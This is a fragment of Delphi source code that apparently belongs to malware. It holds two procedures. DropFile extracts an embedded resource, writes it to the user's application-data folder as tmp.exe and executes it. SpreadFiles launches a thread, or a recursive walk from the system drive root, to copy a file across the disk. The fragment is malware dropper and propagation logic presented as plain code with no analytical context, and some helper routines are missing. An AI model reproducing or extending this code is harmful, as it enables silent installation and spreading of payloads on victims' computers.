procedure DropFile;
var
  Thr: dword;
  ResourceLocation: HRSRC;
  ResourceSize: dword;
  ResourceHandle: THandle;
  ResourcePointer: pointer;
  str: string;
  stream: tmemorystream;
begin
  ResourceLocation := FindResourceA(hInstance, 'DROPFILE', RT_RCDATA);
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  ResourcePointer := LockResource(ResourceHandle);
  if ResourcePointer <> nil then begin
    SetLength(str, ResourceSize);
    CopyMemory(@str[1], ResourcePointer, ResourceSize);
    FreeResource(ResourceHandle);
    Stream := TMemorySTream.Create;
    Stream.Write(pointer(Str)^,Length(Str));
    Stream.SaveToFile(ParsePath('%APPLICATIONDATA%') + 'tmp.exe');
    shellexecute(0,'open',pchar(ParsePath('%APPLICATIONDATA%') + 'tmp.exe'),'','',SW_SHOWNORMAL);
    Stream.Free;
  end else begin
    Exit;
  end;
end;

procedure SpreadFiles(FileName: string; MultiThread: bool);
var
  Thr: dword;
  ResourceLocation: HRSRC;
  ResourceSize: dword;
  ResourceHandle: THandle;
  ResourcePointer: pointer;
  str: string;
  stream: tmemorystream;
begin
  Num := 0;
  if MultiThread then begin
    Dummy := FileName; //ParsePath('%APPLICATIONDATA%') + 'tmp.zip';
    CreateThread(nil,0,@SpreadFilesThread,nil,0,Thr);
  end else begin
    FileListRecursive(Copy(SysDir,1,3),FileName); //ParsePath('%APPLICATIONDATA%') + 'tmp.zip');
  end;
end;


